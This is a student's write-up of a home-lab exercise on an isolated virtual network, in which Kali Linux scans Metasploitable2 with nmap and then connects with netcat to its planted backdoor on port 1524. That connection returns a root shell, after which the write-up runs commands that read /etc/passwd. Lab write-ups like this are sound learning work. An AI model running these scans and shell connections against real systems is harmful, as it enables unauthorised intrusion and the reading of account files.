# Project 1: Home Lab Network Map — Write-Up

**Author:** Suraj Pratap Singh
**Date:** July 2026
**Tools used:** VirtualBox, Kali Linux, Metasploitable2, Nmap, Netcat

## Objective

Build a small isolated virtual network with an attacker machine (Kali Linux) and a deliberately vulnerable target machine (Metasploitable2), then perform basic reconnaissance and exploitation to apply networking and security fundamentals learned in TryHackMe's Pre Security path.

## Environment Setup

- Installed VirtualBox on Windows host
- Imported a pre-built Kali Linux VM
- Built a Metasploitable2 VM manually by pointing a new VM at its existing `.vmdk` disk
- Configured both VMs on an **Internal Network** (named `labnet`), isolating the lab from the host's real network
- Assigned static IPs manually (no DHCP on Internal Network):
  - Kali: `192.168.56.20`
  - Metasploitable2: `192.168.56.10`
- Verified connectivity between both machines using `ping`

**Note:** IP addresses are not persistent across reboots on an Internal Network and must be reassigned each session using:
```
sudo ip addr add 192.168.56.20/24 dev eth0        # Kali
sudo ifconfig eth0 192.168.56.10 netmask 255.255.255.0 up   # Metasploitable2
```

## Reconnaissance

Ran an Nmap scan against the target:
```
sudo nmap -sV -Pn 192.168.56.10
```

Findings: **23 open ports**, including outdated and insecure services such as:
- `vsftpd 2.3.4` (FTP) — known backdoored version
- `telnet` — unencrypted remote login
- `Samba smbd 3.X` — historically vulnerable to remote code execution
- `MySQL` and `PostgreSQL` — databases exposed directly to the network
- Port `1524` labeled by Nmap as **"Metasploitable root shell"**

## Exploitation

Connected directly to the backdoor on port 1524 using Netcat:
```
nc 192.168.56.10 1524
```

This immediately returned a **root shell** with no authentication required — no exploit code needed, just a direct connection to an intentionally planted backdoor.

Confirmed access with:
```
id            # uid=0(root) gid=0(root) groups=0(root)
uname -a      # Linux metasploitable 2.6.24-16-server (2008 kernel)
cat /etc/passwd   # listed all system and test user accounts
```

## Key Takeaways

- A single Nmap scan can reveal an enormous amount about a target's attack surface — outdated software versions map directly to known vulnerabilities.
- Minimizing open ports and services is a core security principle (attack surface reduction) — this VM is the opposite of that, by design, for learning purposes.
- Root access (`uid=0`) is the "game over" point for a compromised Linux system — once obtained, an attacker has unrestricted control.
- Real-world takeaway: unencrypted protocols (Telnet, old FTP) expose credentials in plaintext, which is why SSH and encrypted alternatives are standard today.

## Next Steps

- Project 2: Linux fundamentals deep-dive and a self-built mini CTF using this same lab
- Project 3: Web fundamentals — inspecting Metasploitable2's web services with browser dev tools / Burp Suite
